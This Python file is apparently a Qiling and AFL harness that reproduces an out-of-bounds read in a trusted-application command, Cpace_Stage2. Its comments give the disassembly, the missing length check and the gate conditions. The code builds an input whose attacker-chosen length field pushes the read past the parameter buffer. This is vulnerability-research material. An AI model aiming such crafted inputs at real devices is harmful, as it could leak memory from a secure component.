#from params import *
from .params import *
from pwn import *
from qiling import Qiling
import struct, os

# === AUTHSECRET-1 / S16-F6 structure-aware reproduction harness ========
# Target: klee authsecret/weaver 8aaaf201-2460-0010-aabbccdd00000006 (the S16-pinned
#   build, sha c30be417…), staged misa-style (no inline GP table). cmd 0x10000011 =
#   Cpace_Stage2 @0x22270.
#
# REAL gate (klee, disasm @0x222E4): paramTypes==7 (param0 = MEMREF_INOUT);
#   params[0].size > 0x53 (i.e. >= 0x54)  (cmp w7,#0x53 / b.hi @0x222F0).
#
# BUG (Cpace_Stage2 @0x22270, disasm):
#   ldp w2, w8, [x20]      ; w2=cipherSuite_len, w8=Ya_len  (attacker u32s from buf[0:8])
#   add x1, x20, #0x14     ; payload base = buf + 0x14 (20-byte header)
#   add x28, x1, x2        ; Ya = buf+0x14+cipherSuite_len   <-- POISONED, no clamp
#   add x26, x28, x8       ; Ta = Ya + Ya_len                <-- POISONED
#   ...
#   mov x1,x28 ; mov w2,#0x20 ; bl #0x22058   ; read 32 B of "Ya" at attacker offset
#   mov x1,x26 ; mov w2,#0x40 ; bl #0x22058   ; read 64 B of "Ta" at attacker offset
#   No cmp of cipherSuite_len/Ya_len vs params[0].size anywhere before the reads.
#   These reads happen BEFORE the session-primed check (bl #0x297b8 @0x223f4), so no
#   prior Cpace_Stage1 is needed to reach the OOB read.
#
# Input frame (param0, MEMREF_INOUT, size >= 0x54):
#   [u32 cipherSuite_len][u32 Ya_len][...0xC more header...][payload]
# Set cipherSuite_len huge so Ya = buf+0x14+cipherSuite_len lands far past the
# redzoned param buffer => asan OOB read / READ_UNMAPPED == S16-F6 REPRODUCED.

CMD = 0x10000011
PTYPES = 0x7           # param0 = MEMREF_INOUT
P0SZ = 0x60            # > 0x53

# cipherSuite_len: poison offset. Even a value > P0SZ trips the redzone; a large
# value (0x10000) guarantees a clean unmapped read well past the buffer.
CS_LEN = int(os.environ.get("F6_CSLEN", str(0x10000)), 0) & 0xFFFFFFFF
YA_LEN = int(os.environ.get("F6_YALEN", "0"), 0) & 0xFFFFFFFF

def _build(cs_len, ya_len):
    # 20-byte header: [cipherSuite_len][Ya_len][buf[8]=Tb_outbuf_len][2 more u32]
    hdr = struct.pack("<IIIII", cs_len, ya_len, 0, 0, 0)   # 20 bytes
    body = b"\x00" * (P0SZ - len(hdr))
    return (hdr + body)[:P0SZ].ljust(P0SZ, b"\x00")

def place_input_callback(ql: Qiling, input: bytes, _: int):
    cs_len = CS_LEN
    ya_len = YA_LEN
    if len(input) >= 4 and "F6_CSLEN" not in os.environ:
        # AFL explores poison offsets that overrun the 0x60 buffer
        cs_len = 0x100 + (struct.unpack_from("<I", input, 0)[0] % 0x100000)
    buf = _build(cs_len, ya_len)
    print(f"[F6] cmd=0x10000011 Cpace_Stage2 cipherSuite_len={cs_len:#x} Ya_len={ya_len:#x} "
          f"(Ya=buf+0x14+{cs_len:#x} -> OOB read past {P0SZ:#x} param buf)")
    command_params = [
        MemRefParam(buf, P0SZ),   # param0 MEMREF_INOUT (redzoned -> OOB read trips)
        NoneParam(),
        NoneParam(),
        NoneParam(),
    ]
    setup_params_fuzz(ql, CMD, PTYPES, command_params)
    return True
